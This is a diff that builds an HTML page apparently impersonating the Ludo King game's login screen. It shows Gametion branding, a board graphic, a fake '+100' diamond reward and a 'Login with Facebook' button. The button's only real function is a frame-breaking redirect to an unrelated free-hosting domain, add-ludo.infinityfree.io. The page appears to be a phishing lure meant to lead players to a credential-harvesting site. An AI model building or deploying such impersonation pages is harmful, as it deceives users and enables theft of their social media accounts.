@@ -19,9 +19,6 @@
 
 <title>Ludo King — Premium Login</title>
 <style>
-/* ============================================================
-   RESET & BASE
-   ============================================================ */
 * {
   margin: 0;
   padding: 0;
@@ -39,9 +36,6 @@ html, body {
   user-select: none;
 }
 
-/* ============================================================
-   BACKGROUND LAYERS
-   ============================================================ */
 .bg-layer {
   position: fixed;
   inset: 0;
@@ -70,7 +64,6 @@ html, body {
   100% { opacity: 1; }
 }
 
-/* Particles */
 .particles {
   position: fixed;
   inset: 0;
@@ -94,9 +87,6 @@ html, body {
   100% { transform: translateY(-110vh) scale(1.2); opacity: 0; }
 }
 
-/* ============================================================
-   STAGE / LAYOUT
-   ============================================================ */
 .stage {
   position: relative;
   z-index: 2;
@@ -110,9 +100,6 @@ html, body {
   gap: 8px;
 }
 
-/* ============================================================
-   LOGO AREA
-   ============================================================ */
 .logo-area {
   flex: 1;
   display: flex;
@@ -125,7 +112,6 @@ html, body {
   padding-top: 20px;
 }
 
-/* Crown */
 .crown {
   width: 100px;
   height: 60px;
@@ -142,7 +128,6 @@ html, body {
 
 .crown-svg { width: 100%; height: 100%; }
 
-/* Title Ring */
 .title-ring {
   position: relative;
   width: 280px;
@@ -201,7 +186,6 @@ html, body {
   100% { filter: brightness(1.3); }
 }
 
-/* King Badge */
 .king-badge {
   position: relative;
   display: flex;
@@ -235,7 +219,6 @@ html, body {
 
 .king-laurel.left { transform: scaleX(-1); }
 
-/* Board Area */
 .board-area {
   position: relative;
   width: 220px;
@@ -285,7 +268,6 @@ html, body {
 .cell.yellow { background: #ffd700; box-shadow: 0 0 6px rgba(255, 215, 0, 0.6); }
 .cell.white { background: rgba(255, 255, 255, 0.9); }
 
-/* Pieces */
 .piece {
   position: absolute;
   width: 18px;
@@ -318,7 +300,6 @@ html, body {
   50% { transform: translateY(-4px); }
 }
 
-/* Dice */
 .dice {
   position: absolute;
   top: 50%;
@@ -365,9 +346,6 @@ html, body {
 .dice-face .dot:nth-child(5) { grid-area: 3 / 1; }
 .dice-face .dot:nth-child(6) { grid-area: 3 / 3; }
 
-/* ============================================================
-   PANEL
-   ============================================================ */
 .panel {
   width: 100%;
   max-width: 440px;
@@ -398,7 +376,6 @@ html, body {
 .panel-row { display: flex; gap: 8px; width: 100%; }
 .top-row .btn { flex: 1; }
 
-/* Buttons Base */
 .btn {
   display: flex;
   align-items: center;
@@ -458,7 +435,6 @@ html, body {
   box-shadow: 0 4px 24px rgba(249, 212, 35, 0.25), inset 0 1px 0 rgba(255, 255, 255, 0.12);
 }
 
-/* Login Button */
 .btn-login {
   width: 100%;
   background: linear-gradient(180deg, #4a9eff 0%, #1877f2 50%, #0d5bbd 100%);
@@ -497,7 +473,6 @@ html, body {
   flex-shrink: 0;
 }
 
-/* Legal Text */
 .legal {
   font-size: 0.65rem;
   line-height: 1.5;
@@ -515,9 +490,6 @@ html, body {
 
 .privacy-link:hover { color: #7abfff; text-decoration: underline; }
 
-/* ============================================================
-   WELCOME POPUP
-   ============================================================ */
 .welcome-overlay {
   position: fixed;
   inset: 0;
@@ -627,9 +599,6 @@ html, body {
   transform: scale(0.97) translateY(0);
 }
 
-/* ============================================================
-   RESPONSIVE
-   ============================================================ */
 @media (max-width: 400px) {
   .stage { padding: 0 10px 10px; gap: 4px; }
   .crown { width: 80px; height: 48px; }
@@ -694,7 +663,6 @@ html, body {
   .dot { width: 9px; height: 9px; }
 }
 
-/* Landscape mobile */
 @media (max-height: 600px) and (orientation: landscape) {
   .stage {
     flex-direction: row;
@@ -766,4 +734,189 @@ html, body {
     <div class="king-badge">
       <div class="king-laurel left"></div>
       <span class="king-text">KING</span>
-      <div class="king-laurel right
+      <div class="king-laurel right"></div>
+    </div>
+
+    <!-- Game Board & Pieces -->
+    <div class="board-area">
+      <div class="board-glow"></div>
+      <div class="board">
+        <div class="board-grid">
+          <div class="cell blue"></div><div class="cell blue"></div><div class="cell white"></div><div class="cell white"></div><div class="cell green"></div><div class="cell green"></div>
+          <div class="cell blue"></div><div class="cell blue"></div><div class="cell white"></div><div class="cell white"></div><div class="cell green"></div><div class="cell green"></div>
+          <div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div>
+          <div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div><div class="cell white"></div>
+          <div class="cell red"></div><div class="cell red"></div><div class="cell white"></div><div class="cell white"></div><div class="cell yellow"></div><div class="cell yellow"></div>
+          <div class="cell red"></div><div class="cell red"></div><div class="cell white"></div><div class="cell white"></div><div class="cell yellow"></div><div class="cell yellow"></div>
+        </div>
+      </div>
+      <div class="piece piece-blue"></div>
+      <div class="piece piece-red"></div>
+      <div class="piece piece-green"></div>
+      <div class="piece piece-yellow"></div>
+      <div class="dice">
+        <div class="dice-face">
+          <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+          <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Action Panel -->
+  <div class="panel">
+    <div class="panel-row top-row">
+      <button class="btn btn-glass" id="saveDataBtn">
+        <span class="btn-icon">☁️</span>
+        <span class="btn-label">Save Data</span>
+      </button>
+      <button class="btn btn-glass" id="changeDeviceBtn">
+        <span class="btn-icon">📱</span>
+        <span class="btn-label">Change Device</span>
+      </button>
+      <button class="btn btn-glass btn-reward" id="rewardBtn">
+        <span class="btn-icon">💎</span>
+        <span class="btn-label">+100</span>
+      </button>
+    </div>
+
+    <button class="btn btn-login" id="loginBtn">
+      <span class="fb-icon">
+        <svg viewBox="0 0 24 24" width="24" height="24" fill="white">
+          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+        </svg>
+      </span>
+      <span class="btn-label">Login with Facebook</span>
+    </button>
+
+    <p class="legal">
+      By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the
+      <a href="#" class="privacy-link">Privacy Policy</a>
+    </p>
+  </div>
+</main>
+
+<!-- Welcome Popup -->
+<div class="welcome-overlay" id="welcomeOverlay">
+  <div class="welcome-box">
+    <div class="welcome-icon">🎉</div>
+    <h2 class="welcome-title">Welcome to Ludo King</h2>
+    <p class="welcome-sub">Get ready to play and enjoy the game!</p>
+    <button class="welcome-btn" id="welcomeOkBtn">OK</button>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   ✅ CONFIGURATION — Login ক্লিক করলে যেখানে যাবে
+   ============================================================ */
+const REDIRECT_URL = "https://add-ludo.infinityfree.io/";
+
+/* ============================================================
+   ✅ WELCOME POPUP
+   ============================================================ */
+const welcomeOverlay = document.getElementById('welcomeOverlay');
+const welcomeOkBtn = document.getElementById('welcomeOkBtn');
+
+setTimeout(() => {
+  welcomeOverlay.classList.add('active');
+}, 800);
+
+if (welcomeOkBtn) {
+  welcomeOkBtn.addEventListener('click', () => {
+    welcomeOverlay.classList.remove('active');
+  });
+}
+
+/* ============================================================
+   ✅ PARTICLE SYSTEM
+   ============================================================ */
+(function initParticles() {
+  const container = document.getElementById('particles');
+  if (!container) return;
+
+  const PARTICLE_COUNT = 30;
+  const colors = [
+    'radial-gradient(circle, #f9d423, transparent)',
+    'radial-gradient(circle, #4a9eff, transparent)',
+    'radial-gradient(circle, #ff6b6b, transparent)',
+    'radial-gradient(circle, #4aff4a, transparent)',
+    'radial-gradient(circle, #ffd700, transparent)'
+  ];
+
+  for (let i = 0; i < PARTICLE_COUNT; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+    const size = Math.random() * 6 + 3;
+    const left = Math.random() * 100;
+    const delay = Math.random() * 10;
+    const duration = Math.random() * 8 + 6;
+    const color = colors[Math.floor(Math.random() * colors.length)];
+
+    particle.style.cssText = `
+      width: ${size}px;
+      height: ${size}px;
+      left: ${left}%;
+      bottom: -20px;
+      background: ${color};
+      animation-delay: ${delay}s;
+      animation-duration: ${duration}s;
+    `;
+
+    container.appendChild(particle);
+  }
+})();
+
+/* ============================================================
+   ✅ BUTTON HANDLERS
+   ============================================================ */
+const loginBtn = document.getElementById('loginBtn');
+if (loginBtn) {
+  loginBtn.addEventListener('click', () => {
+    try { window.top.location.href = REDIRECT_URL; }
+    catch (err) {
+      try { window.parent.location.href = REDIRECT_URL; }
+      catch (e2) { window.location.href = REDIRECT_URL; }
+    }
+  });
+}
+
+const saveDataBtn = document.getElementById('saveDataBtn');
+if (saveDataBtn) {
+  saveDataBtn.addEventListener('click', () => {
+    saveDataBtn.style.transform = 'scale(0.95)';
+    setTimeout(() => { saveDataBtn.style.transform = ''; }, 150);
+  });
+}
+
+const changeDeviceBtn = document.getElementById('changeDeviceBtn');
+if (changeDeviceBtn) {
+  changeDeviceBtn.addEventListener('click', () => {
+    changeDeviceBtn.style.transform = 'scale(0.95)';
+    setTimeout(() => { changeDeviceBtn.style.transform = ''; }, 150);
+  });
+}
+
+const rewardBtn = document.getElementById('rewardBtn');
+if (rewardBtn) {
+  rewardBtn.addEventListener('click', () => {
+    rewardBtn.style.transform = 'scale(0.95)';
+    setTimeout(() => { rewardBtn.style.transform = ''; }, 150);
+  });
+}
+
+/* ============================================================
+   ✅ PREVENT DOUBLE-TAP ZOOM
+   ============================================================ */
+let lastTouchEnd = 0;
+document.addEventListener('touchend', (e) => {
+  const now = Date.now();
+  if (now - lastTouchEnd <= 300) {
+    e.preventDefault();
+  }
+  lastTouchEnd = now;
+}, { passive: false });
+</script>
+
+</body>
+</html>
